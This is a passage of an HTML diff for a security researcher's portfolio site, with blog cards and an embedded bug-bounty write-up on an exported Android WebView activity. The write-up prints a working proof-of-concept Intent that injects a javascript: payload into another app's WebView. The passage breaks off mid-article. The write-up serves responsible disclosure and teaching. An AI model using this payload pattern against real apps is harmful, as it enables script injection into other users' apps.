+                            <img src="https://cdn.simpleicons.org/amazon/FF9900" class="hof-logo w-8 h-8 object-contain" alt="Amazon" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">AMAZON</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/intel/0071C5" class="hof-logo w-8 h-8 object-contain" alt="Intel" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">INTEL</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://www.google.com/s2/favicons?domain=lenskart.com&sz=128" class="hof-logo w-8 h-8 object-contain rounded-sm" alt="Lenskart" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">LENSKART</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/philips/0B5EA4" class="hof-logo w-8 h-8 object-contain" alt="Philips" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">PHILIPS</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/coinbase/0052FF" class="hof-logo w-8 h-8 object-contain" alt="Coinbase" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">COINBASE</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/github/FFFFFF" class="hof-logo w-8 h-8 object-contain" alt="GitHub" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">GITHUB</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/paypal/00457C" class="hof-logo w-8 h-8 object-contain" alt="PayPal" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">PAYPAL</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/adobe/FF0000" class="hof-logo w-8 h-8 object-contain" alt="Adobe" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">ADOBE</span>
+                        </div>
+                    </div>
+                    <!-- Second Set (Duplicate for seamless loop) -->
+                    <div class="flex items-center gap-16 px-8">
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/google/4285F4" class="hof-logo w-8 h-8 object-contain" alt="Google" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">GOOGLE</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/microsoft/5E5E5E" class="hof-logo w-8 h-8 object-contain" alt="Microsoft" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">MICROSOFT</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/apple/FFFFFF" class="hof-logo w-8 h-8 object-contain" alt="Apple" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">APPLE</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/meta/0668E1" class="hof-logo w-8 h-8 object-contain" alt="Meta" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">META</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/amazon/FF9900" class="hof-logo w-8 h-8 object-contain" alt="Amazon" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">AMAZON</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/intel/0071C5" class="hof-logo w-8 h-8 object-contain" alt="Intel" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">INTEL</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://www.google.com/s2/favicons?domain=lenskart.com&sz=128" class="hof-logo w-8 h-8 object-contain rounded-sm" alt="Lenskart" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">LENSKART</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/philips/0B5EA4" class="hof-logo w-8 h-8 object-contain" alt="Philips" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">PHILIPS</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/coinbase/0052FF" class="hof-logo w-8 h-8 object-contain" alt="Coinbase" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">COINBASE</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/github/FFFFFF" class="hof-logo w-8 h-8 object-contain" alt="GitHub" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">GITHUB</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/paypal/00457C" class="hof-logo w-8 h-8 object-contain" alt="PayPal" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">PAYPAL</span>
+                        </div>
+                        <div class="flex items-center gap-4">
+                            <img src="https://cdn.simpleicons.org/adobe/FF0000" class="hof-logo w-8 h-8 object-contain" alt="Adobe" referrerPolicy="no-referrer">
+                            <span class="font-display font-black text-2xl text-white tracking-tighter">ADOBE</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Blog & Insights Section -->
+        <section id="blog" class="mt-20 sm:mt-32 relative z-20 scroll-mt-24">
+            <div class="flex flex-col md:flex-row md:items-end justify-between mb-12 gap-8">
+                <div>
+                    <span class="text-accent font-display text-xs tracking-[0.4em] uppercase opacity-60 mb-2 block">Intel_Feed</span>
+                    <h2 class="font-display text-3xl sm:text-4xl md:text-5xl font-extrabold text-white tracking-tighter">
+                        BLOG & <span class="text-accent italic">INSIGHTS</span>
+                    </h2>
+                </div>
+                
+                <!-- Filters -->
+                <div class="flex flex-wrap gap-2 no-scrollbar overflow-x-auto pb-2 md:pb-0 -mx-4 px-4 sm:mx-0 sm:px-0">
+                    <button class="filter-btn active min-h-[40px] px-4 py-2.5 rounded-full border border-primary/50 bg-white/10 text-[10px] font-display font-bold tracking-widest text-white hover:border-primary/50 active:scale-95 transition-all uppercase shrink-0" data-category="all">All</button>
+                    <button class="filter-btn min-h-[40px] px-4 py-2.5 rounded-full border border-white/10 bg-white/5 text-[10px] font-display font-bold tracking-widest text-slate-400 hover:text-white hover:border-primary/50 active:scale-95 transition-all uppercase shrink-0" data-category="android">Android Security</button>
+                    <button class="filter-btn min-h-[40px] px-4 py-2.5 rounded-full border border-white/10 bg-white/5 text-[10px] font-display font-bold tracking-widest text-slate-400 hover:text-white hover:border-primary/50 active:scale-95 transition-all uppercase shrink-0" data-category="ios">iOS Security</button>
+                    <button class="filter-btn min-h-[40px] px-4 py-2.5 rounded-full border border-white/10 bg-white/5 text-[10px] font-display font-bold tracking-widest text-slate-400 hover:text-white hover:border-primary/50 active:scale-95 transition-all uppercase shrink-0" data-category="web">Web Security</button>
+                    <button class="filter-btn min-h-[40px] px-4 py-2.5 rounded-full border border-white/10 bg-white/5 text-[10px] font-display font-bold tracking-widest text-slate-400 hover:text-white hover:border-primary/50 active:scale-95 transition-all uppercase shrink-0" data-category="web3">Web3 Security</button>
+                    <button class="filter-btn min-h-[40px] px-4 py-2.5 rounded-full border border-white/10 bg-white/5 text-[10px] font-display font-bold tracking-widest text-slate-400 hover:text-white hover:border-primary/50 active:scale-95 transition-all uppercase shrink-0" data-category="philosophy">Philosophy</button>
+                </div>
+            </div>
+
+            <div id="blog-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 sm:gap-8">
+                <!-- Blog Card 1 -->
+                <div class="blog-card intel-card group rounded-2xl p-0 cursor-pointer" style="--card-accent: #00FFC2; --card-accent-alpha: rgba(0, 255, 194, 0.05);" data-category="android" onclick="openBlogModal('webview-bites-back')">
+                    <div class="card-glow"></div>
+                    <div class="p-8 space-y-6 relative z-10">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-2">
+                                <div class="w-1.5 h-1.5 rounded-full bg-primary animate-pulse"></div>
+                                <span class="text-[10px] font-display font-bold tracking-[0.2em] text-primary uppercase">DECLASSIFIED</span>
+                            </div>
+                            <span class="text-[10px] font-display text-slate-500 tracking-widest uppercase">JAN 2025</span>
+                        </div>
+                        
+                        <div class="space-y-3">
+                            <h3 class="text-xl font-display font-bold blog-title leading-tight">
+                                When WebView Bites Back: The Bug That Let JavaScript Run Wild
+                            </h3>
+                            <p class="text-slate-400 text-sm font-display leading-relaxed line-clamp-3">
+                                Discovering how improper WebView implementations in Android applications can lead to arbitrary JavaScript execution and potential security risks.
+                            </p>
+                        </div>
+
+                        <div class="pt-6 border-t border-white/5 flex items-center justify-between">
+                            <span class="category-tag">Android Security</span>
+                            <div class="flex items-center gap-2 text-primary opacity-0 group-hover:opacity-100 transition-all transform translate-x-2 group-hover:translate-x-0">
+                                <span class="text-[10px] font-display font-bold tracking-widest">ACCESS_FILE</span>
+                                <i data-lucide="chevron-right" class="w-4 h-4"></i>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Blog Card 2 -->
+                <div class="blog-card intel-card group rounded-2xl p-0 cursor-pointer" style="--card-accent: #00FFC2; --card-accent-alpha: rgba(0, 255, 194, 0.05);" data-category="android" onclick="openBlogModal('news-app-oauth')">
+                    <div class="card-glow"></div>
+                    <div class="p-8 space-y-6 relative z-10">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-2">
+                                <div class="w-1.5 h-1.5 rounded-full bg-primary animate-pulse"></div>
+                                <span class="text-[10px] font-display font-bold tracking-[0.2em] text-primary uppercase">ENCRYPTED</span>
+                            </div>
+                            <span class="text-[10px] font-display text-slate-500 tracking-widest uppercase">DEC 2024</span>
+                        </div>
+                        
+                        <div class="space-y-3">
+                            <h3 class="text-xl font-display font-bold blog-title leading-tight">
+                                How a News App Leaked OAuth Codes: A Real-World Interception Story
+                            </h3>
+                            <p class="text-slate-400 text-sm font-display leading-relaxed line-clamp-3">
+                                Discovering a critical vulnerability in an Android news application that allowed malicious apps to intercept OAuth authorization codes.
+                            </p>
+                        </div>
+
+                        <div class="pt-6 border-t border-white/5 flex items-center justify-between">
+                            <span class="category-tag">Android Security</span>
+                            <div class="flex items-center gap-2 text-primary opacity-0 group-hover:opacity-100 transition-all transform translate-x-2 group-hover:translate-x-0">
+                                <span class="text-[10px] font-display font-bold tracking-widest">DECRYPT_DATA</span>
+                                <i data-lucide="chevron-right" class="w-4 h-4"></i>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Blog Card 3 -->
+                <div class="blog-card intel-card group rounded-2xl p-0 cursor-pointer" style="--card-accent: #FFB800; --card-accent-alpha: rgba(255, 184, 0, 0.05);" data-category="web" onclick="openBlogModal('sqli-finding')">
+                    <div class="card-glow"></div>
+                    <div class="p-8 space-y-6 relative z-10">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-2">
+                                <div class="w-1.5 h-1.5 rounded-full bg-[#FFB800] animate-pulse"></div>
+                                <span class="text-[10px] font-display font-bold tracking-[0.2em] text-[#FFB800] uppercase">ARCHIVED</span>
+                            </div>
+                            <span class="text-[10px] font-display text-slate-500 tracking-widest uppercase">NOV 2023</span>
+                        </div>
+                        
+                        <div class="space-y-3">
+                            <h3 class="text-xl font-display font-bold blog-title leading-tight">
+                                SQLi Finding and Exploitation
+                            </h3>
+                            <p class="text-slate-400 text-sm font-display leading-relaxed line-clamp-3">
+                                A detailed walkthrough of discovering and exploiting a SQL injection vulnerability that led to a significant bug bounty reward.
+                            </p>
+                        </div>
+
+                        <div class="pt-6 border-t border-white/5 flex items-center justify-between">
+                            <span class="category-tag">Web Security</span>
+                            <div class="flex items-center gap-2 text-[#FFB800] opacity-0 group-hover:opacity-100 transition-all transform translate-x-2 group-hover:translate-x-0">
+                                <span class="text-[10px] font-display font-bold tracking-widest">READ_LOGS</span>
+                                <i data-lucide="chevron-right" class="w-4 h-4"></i>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Blog Card 4 -->
+                <div class="blog-card intel-card group rounded-2xl p-0 cursor-pointer" style="--card-accent: #FF00E5; --card-accent-alpha: rgba(255, 0, 229, 0.05);" data-category="web3" onclick="openBlogModal('unlimited-mint')">
+                    <div class="card-glow"></div>
+                    <div class="p-8 space-y-6 relative z-10">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-2">
+                                <div class="w-1.5 h-1.5 rounded-full bg-[#FF00E5] animate-pulse"></div>
+                                <span class="text-[10px] font-display font-bold tracking-[0.2em] text-[#FF00E5] uppercase">HIGH</span>
+                            </div>
+                            <span class="text-[10px] font-display text-slate-500 tracking-widest uppercase">MAR 2025</span>
+                        </div>
+                        
+                        <div class="space-y-3">
+                            <h3 class="text-xl font-display font-bold blog-title leading-tight">
+                                Unlimited Mint: The Chair Function That Could Break a Stablecoin
+                            </h3>
+                            <p class="text-slate-400 text-sm font-display leading-relaxed line-clamp-3">
+                                Analysis of a critical vulnerability in a federated token contract that allowed unlimited minting of the underlying token.
+                            </p>
+                        </div>
+
+                        <div class="pt-6 border-t border-white/5 flex items-center justify-between">
+                            <span class="category-tag">Web3 Security</span>
+                            <div class="flex items-center gap-2 text-[#FF00E5] opacity-0 group-hover:opacity-100 transition-all transform translate-x-2 group-hover:translate-x-0">
+                                <span class="text-[10px] font-display font-bold tracking-widest">MINT_TOKENS</span>
+                                <i data-lucide="chevron-right" class="w-4 h-4"></i>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Blog Card 5 -->
+                <div class="blog-card intel-card group rounded-2xl p-0 cursor-pointer" style="--card-accent: #00A3FF; --card-accent-alpha: rgba(0, 163, 255, 0.05);" data-category="philosophy" onclick="openBlogModal('good-vs-bad')">
+                    <div class="card-glow"></div>
+                    <div class="p-8 space-y-6 relative z-10">
+                        <div class="flex items-center justify-between">
+                            <div class="flex items-center gap-2">
+                                <div class="w-1.5 h-1.5 rounded-full bg-[#00A3FF] animate-pulse"></div>
+                                <span class="text-[10px] font-display font-bold tracking-[0.2em] text-[#00A3FF] uppercase">THOUGHT_LOG</span>
+                            </div>
+                            <span class="text-[10px] font-display text-slate-500 tracking-widest uppercase">MAR 2025</span>
+                        </div>
+                        
+                        <div class="space-y-3">
+                            <h3 class="text-xl font-display font-bold blog-title leading-tight">
+                                Good vs. Bad: Are We Seeing Truth or Just Our Own Biases?
+                            </h3>
+                            <p class="text-slate-400 text-sm font-display leading-relaxed line-clamp-3">
+                                Exploring the timeless philosophical debate on whether morality is objective, subjective, or something in between.
+                            </p>
+                        </div>
+
+                        <div class="pt-6 border-t border-white/5 flex items-center justify-between">
+                            <span class="category-tag">Philosophy</span>
+                            <div class="flex items-center gap-2 text-[#00A3FF] opacity-0 group-hover:opacity-100 transition-all transform translate-x-2 group-hover:translate-x-0">
+                                <span class="text-[10px] font-display font-bold tracking-widest">ANALYZE_TRUTH</span>
+                                <i data-lucide="chevron-right" class="w-4 h-4"></i>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    <!-- Blog Post Modal -->
+    <div id="blog-modal" class="fixed inset-0 z-[200] hidden overflow-y-auto bg-[#0f1115]">
+        <div class="min-h-screen flex flex-col">
+            <!-- Modal Header (Sticky) -->
+            <div class="sticky top-0 z-50 bg-[#0f1115]/95 backdrop-blur-md border-b border-white/5 p-4 md:p-6">
+                <div class="max-w-5xl mx-auto flex items-center justify-between">
+                    <div class="flex items-center gap-6">
+                        <div class="flex items-center gap-2">
+                            <div class="w-2 h-2 rounded-full bg-primary animate-pulse"></div>
+                            <span class="text-[10px] font-display font-bold tracking-[0.3em] text-primary uppercase">INTEL_STREAM_ACTIVE</span>
+                        </div>
+                        <div class="hidden md:block h-4 w-px bg-white/10"></div>
+                        <div id="modal-category-tag" class="hidden md:block text-[10px] font-display font-bold tracking-[0.2em] text-slate-400 uppercase">Category</div>
+                    </div>
+                    <div class="flex items-center gap-4">
+                        <button id="modal-share" class="p-2 text-slate-400 hover:text-primary hover:bg-primary/5 rounded-lg transition-all" title="Share Intel">
+                            <i data-lucide="share-2" class="w-5 h-5"></i>
+                        </button>
+                        <button id="close-modal" class="flex items-center gap-2 min-h-[44px] px-4 py-3 bg-white/5 border border-white/10 rounded-lg hover:bg-white/10 hover:border-white/20 active:scale-95 transition-all group">
+                            <span class="text-[10px] font-display font-bold tracking-widest text-white uppercase">TERMINATE</span>
+                            <i data-lucide="x" class="w-4 h-4 text-slate-400 group-hover:text-white"></i>
+                        </button>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Modal Body -->
+            <div class="flex-grow max-w-3xl mx-auto w-full p-4 sm:p-6 md:p-12 lg:p-16 pb-[max(2rem,env(safe-area-inset-bottom))]">
+                <div class="space-y-10">
+                    <!-- Title Section -->
+                    <div class="space-y-6">
+                        <div class="flex items-center gap-4 text-[10px] font-display font-bold tracking-[0.4em] text-slate-500 uppercase">
+                            <span id="modal-date">Date</span>
+                            <span class="text-primary">/</span>
+                            <span>By Balvant</span>
+                        </div>
+                        <h2 id="modal-title" class="text-2xl sm:text-3xl md:text-5xl lg:text-6xl font-display font-extrabold text-white leading-tight tracking-tight">
+                            Blog Title
+                        </h2>
+                        
+                        <!-- Metadata Dashboard -->
+                        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 pt-8 border-t border-white/5">
+                            <div class="space-y-1">
+                                <span class="text-[9px] font-display text-slate-500 tracking-widest uppercase">Severity_Level</span>
+                                <div id="modal-severity" class="text-lg font-display font-bold text-primary">Low</div>
+                            </div>
+                            <div class="space-y-1">
+                                <span class="text-[9px] font-display text-slate-500 tracking-widest uppercase">Bounty_Reward</span>
+                                <div id="modal-reward" class="text-lg font-display font-bold text-white">REDACTED</div>
+                            </div>
+                            <div class="space-y-1">
+                                <span class="text-[9px] font-display text-slate-500 tracking-widest uppercase">CVSS_Score</span>
+                                <div id="modal-cvss" class="text-lg font-display font-bold text-white">3.9</div>
+                            </div>
+                            <div class="space-y-1">
+                                <span class="text-[9px] font-display text-slate-500 tracking-widest uppercase">Attack_Vector</span>
+                                <div id="modal-vector" class="text-[10px] font-display font-medium text-slate-400 truncate">CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Article Content -->
+                    <div id="modal-body" class="prose prose-invert prose-slate max-w-none font-sans text-slate-200 leading-relaxed text-lg">
+                        <!-- Content will be injected here -->
+                    </div>
+
+                    <!-- Author Footer -->
+                    <div class="pt-16 border-t border-white/5 flex items-center gap-6">
+                        <div class="w-16 h-16 rounded-2xl border border-white/10 p-1 bg-white/5">
+                            <img src="https://api.dicebear.com/7.x/bottts-neutral/svg?seed=Balvant&backgroundColor=00ffba" alt="Author" class="w-full h-full rounded-xl object-cover">
+                        </div>
+                        <div>
+                            <div class="text-xl font-display font-bold text-white">Balvant</div>
+                            <div class="text-xs font-display text-slate-500 tracking-widest uppercase">Security Researcher | Bug Bounty Hunter</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+        <!-- Contact Section -->
+        <section id="contact" class="mt-20 sm:mt-32 relative z-20 scroll-mt-24">
+            <div class="glass-panel border-white/10 rounded-2xl sm:rounded-[40px] p-6 sm:p-8 md:p-16 overflow-hidden relative">
+                <div class="absolute -top-24 -right-24 w-64 h-64 bg-primary/10 blur-[80px] rounded-full"></div>
+                
+                <div class="max-w-3xl mx-auto text-center space-y-8">
+                    <span class="text-primary font-display text-xs tracking-[0.4em] uppercase opacity-60">Establish_Connection</span>
+                    <h2 class="font-display text-3xl sm:text-4xl md:text-6xl font-extrabold text-white tracking-tighter">
+                        HAVE A <span class="text-primary italic">MISSION?</span>
+                    </h2>
+                    <p class="text-slate-400 font-display text-lg leading-relaxed">
+                        Whether it's a security audit, a bug bounty inquiry, or just a technical deep dive, my secure lines are always open.
+                    </p>
+                    
+                    <div class="flex flex-wrap justify-center gap-4 sm:gap-6 pt-6 sm:pt-8">
+                        <a href="mailto:contact@balvant.in" class="flex items-center justify-center gap-3 min-h-[44px] px-6 sm:px-8 py-4 bg-white/5 border border-white/10 rounded-xl hover:bg-white/10 hover:border-primary/50 active:scale-95 transition-all group">
+                            <i data-lucide="mail" class="w-5 h-5 text-primary shrink-0"></i>
+                            <span class="font-display font-bold text-white uppercase tracking-widest text-xs">Email_Researcher</span>
+                        </a>
+                        <a href="https://twitter.com/ba1van7" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center gap-3 min-h-[44px] px-6 sm:px-8 py-4 bg-white/5 border border-white/10 rounded-xl hover:bg-white/10 hover:border-primary/50 active:scale-95 transition-all group">
+                            <i data-lucide="twitter" class="w-5 h-5 text-primary shrink-0"></i>
+                            <span class="font-display font-bold text-white uppercase tracking-widest text-xs">Twitter_Feed</span>
+                        </a>
+                        <a href="https://github.com/balvant-in" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center gap-3 min-h-[44px] px-6 sm:px-8 py-4 bg-white/5 border border-white/10 rounded-xl hover:bg-white/10 hover:border-primary/50 active:scale-95 transition-all group">
+                            <i data-lucide="github" class="w-5 h-5 text-primary shrink-0"></i>
+                            <span class="font-display font-bold text-white uppercase tracking-widest text-xs">Source_Code</span>
+                        </a>
+                        <a href="contact.html" class="flex items-center justify-center gap-3 min-h-[44px] px-6 sm:px-8 py-4 bg-primary/10 border border-primary/30 rounded-xl hover:bg-primary/20 hover:border-primary/50 active:scale-95 transition-all group">
+                            <i data-lucide="send" class="w-5 h-5 text-primary shrink-0"></i>
+                            <span class="font-display font-bold text-white uppercase tracking-widest text-xs">All_Channels</span>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    <!-- Footer Status -->
+        <div class="mt-12 sm:mt-20 flex flex-col sm:flex-row flex-wrap justify-between items-center gap-4 text-slate-500 font-display text-[9px] sm:text-[10px] tracking-[0.3em] sm:tracking-[0.4em] uppercase opacity-60 border-t border-white/5 pt-8 sm:pt-12 pb-8 sm:pb-0">
+            <div class="flex gap-10">
+                <span class="flex items-center gap-2">
+                    <span class="relative flex h-2 w-2">
+                        <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-primary opacity-75"></span>
+                        <span class="relative inline-flex rounded-full h-2 w-2 bg-primary"></span>
+                    </span>
+                    Core_Status: Synchronized
+                </span>
+                <span class="flex items-center gap-2">
+                    <i data-lucide="network" class="w-[10px] h-[10px]"></i>
+                    Nodes: 0xFD21_Active
+                </span>
+            </div>
+            <div class="flex gap-6">
+                <span>// Protocol: TLS_1.3</span>
+                <span>© 2024 Null_Pointer_Ref</span>
+            </div>
+        </div>
+    </main>
+
     <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag(){dataLayer.push(arguments);} 
-        gtag('js', new Date());
-        gtag('config', 'GG-3GS6VRP5FF', {
-            page_title: 'Balvant Chavda - Cybersecurity Researcher',
-            page_location: window.location.href,
-            custom_map: {
-                'custom_parameter_1': 'security_researcher',
-                'custom_parameter_2': 'cve_discoveries'
+        // Blog Content Data
+        const blogPosts = {
+            'webview-bites-back': {
+                title: "When WebView Bites Back: The Bug That Let JavaScript Run Wild",
+                category: "Android Security",
+                date: "January 31, 2025",
+                severity: "Low",
+                reward: "REDACTED",
+                cvss: "3.9",
+                vector: "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N",
+                content: `
+                    <p>Android applications often use WebView components to display web content within their interfaces. While this provides a seamless user experience, improper implementation can lead to significant security vulnerabilities. In this writeup, I'll share my discovery of a WebView vulnerability in a popular news application that allowed arbitrary JavaScript execution through an exported activity.</p>
+                    
+                    <div class="bg-primary/5 border-l-4 border-primary p-6 my-8">
+                        <h4 class="text-primary font-bold mb-2 uppercase text-xs tracking-widest">Note on Responsible Disclosure</h4>
+                        <p class="text-sm italic">This vulnerability was responsibly disclosed to the affected organization. All details shared in this post have been approved for publication after the issue was resolved. The target name has been changed to protect the company's identity.</p>
+                    </div>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Understanding the Vulnerability Context</h3>
+                    <p>WebViews in Android apps are powerful components that display web content using the system's WebView implementation. They can be configured to execute JavaScript, access file systems, and interact with Android app components through JavaScript interfaces. However, this power comes with security risks if not properly implemented.</p>
+                    
+                    <p>The vulnerability I discovered in the news application existed due to two critical issues:</p>
+                    <ul class="list-disc pl-6 space-y-2">
+                        <li>An exported WebView activity in the Android manifest</li>
+                        <li>JavaScript execution enabled without proper URL validation</li>
+                    </ul>
+                    <p>These issues combined allowed a malicious application on the same device to launch the vulnerable activity with a crafted JavaScript URL, executing arbitrary JavaScript code within the context of the news application.</p>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Technical Analysis</h3>
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">Vulnerable Components</h4>
+                    <p>After examining the application's manifest file, I discovered that the AdBrowserActivity, which contains a WebView for displaying content, was publicly exported and accessible to other applications:</p>
+                    
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+&lt;activity
+    android:name="org.prebid.mobile.rendering.views.browser.AdBrowserActivity"
+    android:exported="true"
+    android:launchMode="singleTop"
+    android:configChanges="screenSize|orientation|keyboardHidden"
+    android:windowSoftInputMode="adjustPan|stateHidden"/&gt;</pre>
+
+                    <p>Further analysis of the AdBrowserActivity implementation revealed that JavaScript was enabled in the WebView without proper URL validation:</p>
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+webView.getSettings().setJavaScriptEnabled(true);
+this.f50312a.loadUrl(this.f50318g); // Loads URL without validation</pre>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">The Attack Vector</h3>
+                    <p>The attack vector involves a malicious application creating an intent that targets the exported activity and providing a JavaScript URL as an extra. When the activity is launched, it loads the provided URL in the WebView, executing the JavaScript code in the context of the news application.</p>
+                    
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+Intent intent = new Intent();
+intent.setComponent(new ComponentName(
+    "com.news.app.package",
+    "org.prebid.mobile.rendering.views.browser.AdBrowserActivity"
+));
+intent.putExtra("EXTRA_URL", "javascript:alert('XSS Executed Successfully!')");
+intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+startActivity(intent);</pre>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Proof of Concept Exploitation</h3>
+                    <p>To demonstrate this vulnerability, I developed a proof-of-concept application that launches the vulnerable activity with malicious JavaScript payload.</p>
+
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">PoC Implementation</h4>
+                    <pre class="bg-black/50 p-6 rounded-xl border border-white/10 overflow-x-auto text-xs font-mono text-primary/80 my-6">
+Intent intent = new Intent();
+intent.setComponent(new ComponentName(
+    "com.news.app.package",
+    "org.prebid.mobile.rendering.views.browser.AdBrowserActivity"
+));
+String jsPayload = "javascript:" +
+    "document.write('&lt;div style=\"background:black;color:red;padding:20px;font-size:20px;\"&gt;');" +
+    "document.write('&lt;h1&gt;XSS Attack Successful!&lt;/h1&gt;');" +
+    "document.write('&lt;p&gt;WebView Security Issues:&lt;/p&gt;');" +
+    "document.write('&lt;ul&gt;');" +
+    "document.write('&lt;li&gt;JavaScript Execution: ' + window.navigator.userAgent + '&lt;/li&gt;');" +
+    "document.write('&lt;li&gt;WebView Info: ' + navigator.platform + '&lt;/li&gt;');" +
+    "document.write('&lt;/ul&gt;&lt;/div&gt;');" +
+    "alert('XSS Executed Successfully!');";
+intent.putExtra("EXTRA_URL", jsPayload);
+intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+startActivity(intent);</pre>
+
+                    <h4 class="text-xl font-bold text-primary mt-8 mb-2">Exploitation Steps</h4>
+                    <ol class="list-decimal pl-6 space-y-2">
+                        <li>Install the target news application on a test device</li>
+                        <li>Install the proof-of-concept application on the same device</li>
+                        <li>Launch the PoC application and press the "Launch XSS Attack" button</li>
+                        <li>Observe as the news app launches and the JavaScript payload executes</li>
+                        <li>Confirm successful execution by verifying the displayed information and alert</li>
+                    </ol>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Impact Analysis</h3>
+                    <p>While the vulnerability has a "Low" severity rating according to CVSS (3.9), it still poses several risks to users of the application:</p>
+                    <ul class="list-disc pl-6 space-y-2">
+                        <li>JavaScript code executed in the context of the news app can access WebView information and potentially sensitive data</li>
+                        <li>Attackers could modify content displayed to users, potentially enabling phishing attacks</li>
+                        <li>The vulnerability could be used to display misleading information or fake content to users</li>
+                        <li>In combination with other vulnerabilities, it could potentially lead to more severe exploits</li>
+                    </ul>
+
+                    <div class="bg-white/5 border border-white/10 p-6 my-8 rounded-xl">
+                        <h4 class="text-white font-bold mb-2 uppercase text-xs tracking-widest">Impact Limitations</h4>
+                        <p class="text-sm text-slate-400">The severity is considered low because exploitation requires:</p>
+                        <ul class="list-disc pl-6 mt-2 text-sm text-slate-400 space-y-1">
+                            <li>A malicious app to be installed on the user's device</li>
+                            <li>User interaction to launch the attack</li>
+                            <li>Limited access to the WebView's context rather than the broader application context</li>
+                        </ul>
+                    </div>
+
+                    <h3 class="text-2xl font-bold text-white mt-12 mb-4">Real-World Attack Scenario</h3>
